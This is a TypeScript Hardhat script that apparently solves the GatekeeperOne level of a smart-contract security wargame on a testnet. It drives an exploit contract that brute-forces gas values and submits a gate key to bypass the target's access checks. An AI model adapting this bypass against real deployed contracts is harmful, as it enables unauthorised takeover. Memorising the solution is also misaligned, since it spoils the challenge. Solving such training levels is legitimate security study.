import { ethers } from "hardhat";

/**
 * Execute the exploit on the GatekeeperOne contract to pass through all gates
 * and become the entrant using the GatekeeperOneExploit contract
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No GatekeeperOneExploit contract address provided.");
    console.error("Please provide the address of your deployed GatekeeperOneExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-13-gatekeeper-1/execute-gatekeeper-one-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using GatekeeperOneExploit contract address: ${exploitAddress}`);
  
  // Get the contract factory for GatekeeperOneExploit
  const GatekeeperOneExploit = await ethers.getContractFactory("GatekeeperOneExploit");
  
  // Connect to the deployed contract
  const gatekeeperOneExploit = GatekeeperOneExploit.attach(exploitAddress);
  
  console.log(`Connected to GatekeeperOneExploit contract at: ${exploitAddress}`);
  
  // If TARGET_ADDRESS wasn't provided, get it from the exploit contract
  if (!targetAddress) {
    targetAddress = await gatekeeperOneExploit.getFunction("gatekeeperAddress")();
  }
  console.log(`Target GatekeeperOne contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check if we already passed the gate
    console.log("Checking if we've already passed the gates...");
    const initialSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (initialSuccess) {
      console.log("Gates were already successfully passed! No need to proceed further.");
      return;
    }
    
    // We need to find the right gas amount to pass gate two (gasleft() % 8191 == 0)
    // Start with a base gas amount and try different values
    console.log("Attempting to brute force the correct gas value...");
    console.log("This may take a while as we need to find a gas value such that gasleft() % 8191 == 0...");
    
    // We'll try different ranges of gas values
    const baseGas = 800000; // Start with a high value to ensure enough gas for the operation
    const batchSize = 100;
    let success = false;
    
    for (let i = 0; i < 10 && !success; i++) {
      console.log(`Trying gas values from ${baseGas + i * batchSize} to ${baseGas + (i + 1) * batchSize - 1}...`);
      
      // Brute force a range of gas values
      const bruteForceGasTx = await gatekeeperOneExploit.getFunction("bruteForceGas")(baseGas + i * batchSize, batchSize);
      await bruteForceGasTx.wait();
      
      // Check if we succeeded
      success = await gatekeeperOneExploit.getFunction("success")();
      
      if (success) {
        const gasToUse = await gatekeeperOneExploit.getFunction("gasToUse")();
        console.log(`Found working gas value: ${gasToUse.toString()}`);
        break;
      }
    }
    
    if (!success) {
      console.log("Failed to find a working gas value through brute force.");
      console.log("Let's try with a specific gas value that might work...");
      
      // Let's try with a specific gas value
      const specificGas = 819100; // This value is chosen to possibly make gasleft() % 8191 == 0
      console.log(`Attempting with specific gas value: ${specificGas}...`);
      
      const enterGateTx = await gatekeeperOneExploit.getFunction("enterGate")(specificGas);
      await enterGateTx.wait();
      
      success = await gatekeeperOneExploit.getFunction("success")();
      
      if (success) {
        console.log(`Specific gas value ${specificGas} worked!`);
      }
    }
    
    // Final check
    const finalSuccess = await gatekeeperOneExploit.getFunction("checkSuccess")();
    
    if (finalSuccess) {
      console.log("\nExploit successful! You've passed all gates and become the entrant!");
    } else {
      console.log("\nExploit failed. Could not pass all gates.");
      
      // Show the generated gate key for debugging
      const gateKey = await gatekeeperOneExploit.getFunction("generateGateKey")(deployer.address);
      console.log(`Generated gate key: ${gateKey}`);
      console.log("The gas value might not be correct. Try adjusting the gas values in the script.");
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
